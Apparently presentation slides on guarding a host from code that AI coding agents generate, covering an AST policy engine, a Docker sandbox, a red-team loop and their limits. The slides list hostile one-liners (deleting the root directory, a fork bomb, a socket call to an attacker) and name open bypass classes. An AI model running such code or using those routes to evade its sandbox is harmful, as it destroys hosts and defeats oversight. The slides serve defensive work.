Problem Statement

Presenter: Rishee

Coding agents write and run their own code. One bad generation can damage the host.

DESTROY

shutil.rmtree('/')

wipes the host's files

FORK BOMB

while True: os.fork()

exhausts processes

EXFILTRATE

socket.connect(attacker)

leaks data outward

Detecting bad code statically is undecidable (Rice's theorem), so rules alone are never complete.

Our answer: Layer 1 AST policy engine · Layer 2 locked-down sandbox · measured by a red-team loop.

Workflow: Self-Healing Loop

Presenter: Rishee

  • Success — policy ALLOW and exit code 0, no timeout or OOM
  • Stop conditions — success · 5 iterations · identical code twice
  • Only path to execute — edge from policy_gate ALLOW only, unit-tested
  • Fail closed — budget exhausted ends the run; approval bound to a SHA-256 hash

THE CATCH

Order is guaranteed — not the safety of approved code. The sandbox covers that. Sandbox output is treated as untrusted data before it re-enters a prompt.

Limitations

Presenter: Member 5

  • Heuristic policy — dynamic code cannot always be resolved (Rice's theorem).
  • Shared kernel — Docker shares the host kernel; a kernel 0-day is out of scope.
  • Our corpus only — numbers apply to our data.
  • Partial injection defense — stderr is delimited and labelled as data, not a complete fix.
  • Scope — Python only, single file; obfuscation is flagged, not reversed; ransomware is hardened behaviourally and keys are not recovered.

What still bypasses v3: nothing in the 464-record held-out set. Known open classes are dynamic import resolution, payloads assembled at runtime, and any technique outside R00–R18.

“0 escapes” bounds the rate — it does not prove safety.
